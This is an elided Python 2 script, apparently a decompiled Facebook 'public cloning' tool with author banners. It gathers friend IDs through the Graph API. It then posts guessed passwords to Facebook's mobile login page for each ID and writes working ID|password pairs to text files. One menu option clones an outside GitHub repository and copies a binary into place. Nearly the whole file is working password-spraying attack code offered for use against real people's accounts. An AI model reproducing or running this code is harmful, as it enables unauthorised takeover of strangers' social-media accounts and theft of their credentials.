# Decompile by Mr Jadugar (Kashif-Baloch) Give me credit
# If you wanna remove my name from script it don't work
...
logo = "'\n\n'\x1b[1;91m'db    db d888888b d8888b. db    db .d8888. \n'\x1b[1;91m'88    88   `88'   88  `8D 88    88 88'  YP \n'\x1b[1;91m'Y8    8P    88    88oobY' 88    88 `8bo.   \n'\x1b[1;91m'`8b  d8'    88    88`8b   88    88   `Y8b. \n'\x1b[1;91m' `8bd8'    .88.   88 `88. 88b  d88 db   8D \n'\x1b[1;91m'   YP    Y888888P 88   YD ~Y8888P' `8888Y' \n                                           \n                                           \n\t\n'\x1b[1;92m'   Author      :     VIRUS X3 RAUF     \n'\x1b[1;91m'   Github      :     DARKRULEX  \n'\x1b[1;96m'   FB ID       :     @ROMACHOD\n'\x1b[1;93m'   TOOL NAME   :     VIRUS\n'\x1b[1;94m'   WAP NUMBER  :     +17054823583            \n"
dec = '2'
server = '2'
...
def main_input():
    ...
    if mx == '1':
        ...
        print '        Member In Virus Paid Commands '
        print '        ENJOY  KRO BHI LOGO '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('git clone https://github.com/ahad68')
        os.system('rm -rf P91D')
        os.system('cp -f P91D/P91D \\.')
        os.system('rm -rf P91D')
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[KASHIF-OK] ' + coc + user + ' | ' + pass1
                ok = open('VIRUS-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[KASHIF-CP] ' + coc + user + ' | ' + pass1
                cp = open('VIRUS random-co.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def fb_menu():
    ...
    print ''
    print 39 * '-'
    print '\x1b[1;92m[1] Public Cloning  [KASHIFPro]'
    print '\x1b[1;92m[2] Public Cloning  [KASHIFFast]'
    print '\x1b[1;91m[0] Back '
    print 39 * '-'
    cz = raw_input('[!] Select : ')
    if cz == '1':
        print ''
        print '\x1b[1;91m      [ Public Cloning KASHIFPro ]'
        print ''
        ...
        print ''
        print '\x1b[1;92m      [ Public Cloning KASHIFFast ]'
        print ''
...
def mineExt():
    ...
    print g + '[=] Extracting From KASHIF : ' + my_line[:15]
    ...
    my_line = file.readline()
    count.append(my_line)
    print g + '[=] Extracting From VIRUS : ' + my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck = open('VIRUS.txt', 'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[VIRUS-OK] ' + uid + ' | ' + pass1
                ok = open('Subha-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[VIRUS-CP] ' + uid + ' | ' + pass1
                cp = open('VIRUS-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[KASHIF-OK] ' + uid + ' | ' + pass2
                    ok = open('VIRUS-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[KASHIF-CP] ' + uid + ' | ' + pass2
                    cp = open('VIRUS-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[KASHIF-OK] ' + uid + ' | ' + pass3
                        ok = open('VIRUS-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;97m[KASHIF-CP] ' + uid + ' | ' + pass3
                        cp = open('VIRUS-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[KASHIF-OK] ' + uid + ' | ' + pass4
                            ok = open('VIRUS-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;97m[KASHIF-CP] ' + uid + ' | ' + pass4
                            cp = open('VIRUS-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[KASHIF-OK] ' + uid + ' | ' + pass5
                                ok = open('VIRUS-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;97m[KASHIF-CP] ' + uid + ' | ' + pass5
                                cp = open('VIRUS-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
...
def xokp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[KASHIF-OK] ' + uid + ' | ' + pass1
                ok = open('VIRUS-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[KASHIF-CP] ' + uid + ' | ' + pass1
                cp = open('VIRUS-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[VIRUS-OK] ' + uid + ' | ' + pass2
                    ok = open('VIRUS-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[VIRUS-CP] ' + uid + ' | ' + pass2
                    cp = open('VIRUS-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[VIRUS-OK] ' + uid + ' | ' + pass3
                        ok = open('VIRUS-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;97m[VIRUS-CP] ' + uid + ' | ' + pass3
                        cp = open('VIRUS-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[VIRUS-OK] ' + uid + ' | ' + pass4
                            ok = open('VIRUS-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;97m[VIRUS-CP] ' + uid + ' | ' + pass4
                            cp = open('VIRUS-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[VIRUS-OK] ' + uid + ' | ' + pass5
                                ok = open('VIRUS-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;97m[VIRUS-CP] ' + uid + ' | ' + pass5
                                cp = open('VIRUS-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[KASHIF-OK] ' + uid + ' | ' + pass6
                                    ok = open('VIRUS-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;97m[KASHIF-CP] ' + uid + ' | ' + pass6
                                    cp = open('VIRUS-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
